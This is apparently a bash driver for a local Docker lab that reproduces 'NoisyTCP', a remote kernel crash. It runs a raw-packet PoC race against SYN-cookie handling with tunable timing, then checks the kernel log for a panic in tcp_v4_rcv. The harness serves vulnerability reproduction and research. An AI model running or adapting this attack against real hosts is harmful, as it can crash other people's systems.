#!/usr/bin/env bash
# Driver for the NoisyTCP lab.  Everything is local: one Docker bridge, one
# nginx listener, one raw-packet attacker, one kernel-log monitor.
set -uo pipefail
cd "$(dirname "$0")"

DC="${DC:-docker compose}"
VICTIM_IP=10.213.99.10
ATTACKER_IP=10.213.99.20
PORT=8080
BACKLOG=8
DURATION="${DURATION:-120}"
STRESS="${STRESS:-0}"
BATCH="${BATCH:-4}"

c_ok()   { printf '\033[32m%s\033[0m\n' "$*"; }
c_info() { printf '\033[36m[*]\033[0m %s\n' "$*"; }
c_warn() { printf '\033[33m[!]\033[0m %s\n' "$*"; }

counters() {
	$DC exec -T victim sh -c \
		'nstat -az 2>/dev/null | grep -Ei "syncookie|ReqQFull|EmbryonicRsts|ListenOverflows" || true'
}

kernel_check() {
	printf '%-46s' "kernel:"
	$DC exec -T victim uname -r
	printf '%-46s' "syncookies / max_syn_backlog:"
	$DC exec -T victim sh -c 'cat /proc/sys/net/ipv4/tcp_syncookies /proc/sys/net/ipv4/tcp_max_syn_backlog | tr "\n" " "; echo'
	printf '%-46s' "rps_cpus(eth0):"
	$DC exec -T victim cat /sys/class/net/eth0/queues/rx-0/rps_cpus || true
	printf '%-46s' "listen backlog (ss -lnt Send-Q):"
	$DC exec -T victim sh -c "ss -lnt | awk '\$4 ~ /:$PORT\$/ {print \$3}'" || true
	printf '%-46s' "vCPUs:"
	$DC exec -T victim nproc
	printf '%-46s' "RX queues (eth0):"
	$DC exec -T victim sh -c 'ls -d /sys/class/net/eth0/queues/rx-* | wc -l' || true
	printf '%-46s' "hypervisor steal (VM only):"
	$DC exec -T victim sh -c "awk '/^cpu /{print \$9\" jiffies\"}' /proc/stat" || true
}

case "${1:-help}" in
build)
	c_info "building images"
	$DC build ;;
up)
	c_info "starting lab"
	$DC up -d
	sleep 2
	$DC ps
	kernel_check ;;
probe)
	c_info "single SYN test (does the victim answer raw packets?)"
	$DC exec -T attacker /poc/noisytcp --victim $VICTIM_IP --port $PORT --mode probe ;;
verify)
	c_info "cookie cycle verification"
	counters > /tmp/nc_before.txt
	$DC exec -T attacker /poc/noisytcp --victim $VICTIM_IP --port $PORT \
		--backlog $BACKLOG --mode verify
	sleep 1
	c_info "victim counters (delta)"
	diff -u /tmp/nc_before.txt <(counters) || true
	printf '%-46s' "victim sockets on :$PORT (SYN_RECV/ESTAB):"
	$DC exec -T victim sh -c \
		"ss -tan | awk '\$4 ~ /:$PORT\$/ || \$3 ~ /:$PORT\$/ {print \$1}' | sort | uniq -c | tr '\n' ' '; echo" ;;
trace)
	c_info "instrumentation window (Ctrl-C to stop)"
	$DC exec -T attacker sh -c \
		'mount -t tracefs tracefs /sys/kernel/tracing 2>/dev/null; exec bpftrace /poc/aba.bt' ;;
race)
	c_info "race loop: ${DURATION}s  batch=$BATCH stress=$STRESS"
	counters > /tmp/nc_before.txt
	: > results/kmsg.log 2>/dev/null || true
	$DC exec -T attacker /poc/noisytcp --victim $VICTIM_IP --port $PORT \
		--backlog $BACKLOG --batch $BATCH --duration $DURATION \
		--frag-gap-us "${FRAG_GAP:-20}" --free-gap-us "${FREE_GAP:-1}" \
		--alloc-gap-us "${ALLOC_GAP:-6}" --jitter-us "${JITTER:-6}" \
		--stress $STRESS --mode race
	echo
	c_info "victim counters (delta)"
	diff -u /tmp/nc_before.txt <(counters) || true
	echo
	c_info "kernel log tail"
	tail -n 25 results/kmsg.log 2>/dev/null || c_warn "no kmsg.log"
	if grep -qiE 'kernel panic|Fatal exception in interrupt|BUG: kernel NULL pointer|RIP: .*tcp_v4_rcv' results/kmsg.log 2>/dev/null; then
		c_ok "=== REPRODUCED: kernel hit the NoisyTCP crash ==="
		grep -iE -A6 'kernel panic|BUG: kernel NULL pointer|Fatal exception in interrupt' results/kmsg.log | head -40
	else
		c_warn "no panic in the kernel log (window not hit in this run)"
	fi ;;
status)
	$DC ps
	kernel_check ;;
down)
	$DC down -v --remove-orphans ;;
*)
	cat <<EOF
usage: $0 <command>

  build    build victim/attacker images
  up       start the lab (victim + attacker + kmsg monitor)
  probe    one raw SYN, checks we can talk to the listener
  verify   drive one full SYN-cookie cycle and show victim-side counters
  trace    bpftrace: proves request_sock slab reuse + detects the bug window
  race     run the race loop for \$DURATION seconds
  status   show lab state
  down     stop the lab

env: DURATION=120 BATCH=4 STRESS=0 FRAG_GAP=20 FREE_GAP=1 ALLOC_GAP=6 JITTER=6
EOF
	;;
esac
